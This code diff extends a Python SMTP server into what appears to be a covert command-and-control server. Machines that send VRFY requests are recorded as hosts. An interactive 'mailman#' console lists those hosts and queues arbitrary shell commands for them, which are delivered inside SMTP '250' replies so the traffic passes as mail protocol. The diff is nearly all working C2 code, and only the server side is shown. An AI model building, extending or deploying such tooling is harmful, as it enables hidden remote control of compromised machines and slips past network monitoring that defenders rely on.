@@ -7,6 +7,7 @@ import asynchat
 import socket
 import time
 import errno
+import threading
 from smtpd import *
 
 class Devnull:
@@ -55,15 +56,25 @@ class MailHandler(SMTPChannel):
 
     def smtp_VRFY(self, arg):
         print("Received VRFY for: ",arg)
-        self.push("250 WORDS")
+        if arg in self.smtp_server.waitingCommands:
+            print("Deploying command:", self.smtp_server.waitingCommands[arg], "to", arg)
+            self.push("250 "+self.smtp_server.waitingCommands[arg])
+            self.smtp_server.waitingCommands.pop(arg, None)
+        else:
+            print("No command to deploy for", arg)
+            self.push("252 Perhaps.")
+            if not arg in self.smtp_server.knownHosts:
+                self.smtp_server.knownHosts.append(arg)
     # def smtp_RCPT(self, arg):
     #     self.push("250 NANI?")
 
-class MailmanServer(SMTPServer):
 
+class MailmanServer(SMTPServer):
+    waitingCommands = dict()
+    knownHosts = []
     def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
         print("Message received from: ", mailfrom)
-        print("Data: ", data)
+        print("Data: ", data.decode("UTF-8"))
 
     # def handle_accept(self):
         conn, addr = self.accept()
@@ -80,13 +91,36 @@ class MailmanServer(SMTPServer):
                                      self.enable_SMTPUTF8,
                                      self._decode_data)
 
+def machineList(machines):
+    if len(machines) == 0:
+        print("No known machines.")
+        return
+    for i in range(len(machines)):
+        print(i, ":  ",machines[i])
 
 def run():
     foo = MailmanServer(("localhost", 25), None)
-    print("Server launched")
-    try:
-        asyncore.loop()
-    except KeyboardInterrupt:
-        pass
+    print("Server launched.")
+    print("Commands:")
+    print("         l - List known machines")
+    print("         c # - Set command for machine #")
+    # try:
+    #     asyncore.loop()
+    # except KeyboardInterrupt:
+    #     pass
+    thread = threading.Thread(target=asyncore.loop, kwargs={'timeout': 1})
+    thread.start()
+    while True:
+        cmd = input("mailman# ")
+        if cmd == "" or cmd == None:
+            continue
+        if cmd == "l":
+            machineList(foo.knownHosts)
+        elif cmd[0] == "c":
+            target = int(cmd.split(" ")[1])
+            targetCmd = input("Target$ ")
+            foo.waitingCommands[foo.knownHosts[target]] = targetCmd
+        else:
+            print("Unknown command.")
 
 run()
